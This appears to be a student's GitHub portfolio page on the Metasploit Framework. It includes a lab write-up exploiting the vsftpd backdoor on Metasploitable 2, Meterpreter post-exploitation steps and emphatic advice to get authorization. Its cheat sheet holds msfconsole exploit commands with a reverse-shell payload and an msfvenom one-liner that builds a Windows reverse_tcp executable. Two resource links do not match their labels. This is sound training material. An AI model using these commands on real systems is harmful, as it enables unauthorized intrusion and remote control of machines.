# Metasploit Framework

**Category:** Exploitation & Penetration Testing  
**Difficulty:** Intermediate  

## Description

Metasploit Framework (MSF) is the world’s most used penetration testing framework. It provides a comprehensive environment for developing, testing, and executing exploits.

Security professionals use Metasploit daily for:

- Validating that a discovered vulnerability is actually exploitable, not just theoretically present
- Demonstrating real business impact to stakeholders who need more than a CVE number to prioritize a fix
- Post-exploitation activity (privilege escalation, credential harvesting) within an authorized engagement
- Practicing and understanding attacker tradecraft to build better detections

## Key Components
- Extensive library of exploit, payload, and auxiliary modules
- `msfconsole` — the primary interactive command-line interface
- **Meterpreter** — an advanced, in-memory post-exploitation payload
- Database-backed workspace for tracking hosts, services, and vulnerabilities across an engagement
- `msfvenom` — standalone payload generation and encoding
- Direct integration with reconnaissance data (e.g., imported Nmap scan results)
- Post-exploitation modules for privilege escalation, persistence, and lateral movement

## Hands-on Examples
### Example 1: Exploiting Metasploitable 2 using vsftpd Backdoor
- Successfully exploited a vulnerable FTP service (vsftpd 2.3.4) on Metasploitable 2 using Metasploit to gain root access.



<img width="927" height="196" alt="Screenshot 2026-07-13 125316" src="https://github.com/user-attachments/assets/4c94101e-5eb1-4c1a-ab48-5854d0fd7b0a" />


### Example 2: Post-Exploitation with Meterpreter
- After gaining initial root access via vsftpd backdoor on Metasploitable 2, upgraded the shell to a Meterpreter session.
- Performed reconnaissance and demonstrated post-exploitation capabilities.

<img width="499" height="159" alt="Screenshot 2026-07-13 125340" src="https://github.com/user-attachments/assets/38386fae-6898-4ce2-a69a-4b157b544eaa" />

<img width="233" height="53" alt="Screenshot 2026-07-13 125356" src="https://github.com/user-attachments/assets/689e0415-0175-4c6f-82e4-f81b4e8b3c7a" />

## Demonstrating Control on the Target Machine:

- Dropped into a system shell using the shell command in Meterpreter.
- Created a proof-of-compromise file on the target.

<img width="438" height="115" alt="Screenshot 2026-07-13 133026" src="https://github.com/user-attachments/assets/d307cd16-5284-442f-93fc-9caaed8bcafb" />
<img width="645" height="132" alt="Screenshot 2026-07-13 133146" src="https://github.com/user-attachments/assets/156a8703-5bb0-4e6e-bb8a-b99e13a51426" />


  
**Key Commands Used:**
- sysinfo — Gathered target system details (OS, architecture, hostname, etc.)
- getuid — Confirmed root privileges (uid=0(root))
- whoami — Showed the current user context
- pwd — Displayed the current working directory
- ls — Listed files in the current directory
- ls /etc — Explored system configuration files
- ifconfig — Showed network interfaces and IP addresses

## What I Learned
- Proper use of payloads and listeners is critical.
- Always test exploits in an isolated lab first.
- Metasploit is powerful but understanding the underlying vulnerability is more important.

## Hands-On Learning Path

Metasploit proficiency comes from understanding *why* an exploit works before running it — not from memorizing module names. Below is the progression most cybersecurity students use to build reps, entirely within isolated, authorized lab environments.

**Guided / official starting points**
-  Offensive Security's free "Metasploit Unleashed" course
-  TryHackMe "Metasploit: Introduction" and "Metasploit" rooms

**Home lab (VirtualBox / isolated network)**
-  Exploiting known vulnerable services on a Metasploitable2 VM (e.g., vsftpd backdoor, distcc)
-  Establishing and navigating a Meterpreter session for basic post-exploitation
-  Generating a payload with `msfvenom` and testing it against a lab AV/EDR setup to understand detection

**Applied / integration practice**
-  Chaining a full attack path: Nmap recon → identified service vulnerability → Metasploit exploitation → Meterpreter post-exploitation
-  Mapping a full exploitation chain to MITRE ATT&CK techniques and the Cyber Kill Chain, consistent with the framework used throughout the rest of this portfolio



## Best Practices

- **Authorization is absolutely essential.** Metasploit is a live exploitation tool — among the most legally sensitive in this entire toolbox. Never point it at anything without explicit, written permission.
- **Work in an isolated lab network.** Exploits and payloads should never touch a network segment shared with production or personal systems.
- **Understand the exploit before running it.** Read the module's description and target requirements — "set and forget" usage without understanding the underlying vulnerability limits what you actually learn.
- **Be aware exploits can crash target services.** Some modules are inherently unstable — this is a real operational risk during any authorized engagement, not just a lab inconvenience.
- **Clean up after testing.** Close sessions, remove dropped payloads, and document exactly what was left behind on a target system.
- **Expect AV/EDR to flag generated payloads.** This is by design — treat detection as a learning signal, not an obstacle to bypass in unauthorized contexts.


## Resources
- Official Metasploit Documentation 
- Rapid7 Metasploit Framework GitHub https://docs.rapid7.com/metasploit/
- Metasploit Unleashed (Free course) https://www.offensive-security.com/metasploit-unleashed/
- Metasploitable2 (practice target VM) https://github.com/rapid7/metasploitable3


## Common Commands

### Starting Up

```bash
# Launch the interactive console
msfconsole
```

### Finding and Configuring a Module

```
# Search for a module by keyword/CVE
search type:exploit vsftpd

# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor

# View required and optional settings
show options

# Set target and payload
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD cmd/unix/reverse

# Launch
exploit
```

### Managing Sessions

```
# List active sessions
sessions -l

# Interact with a specific session
sessions -i 1

# Background the current session
background
```

### Payload Generation (msfvenom)

```bash
# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
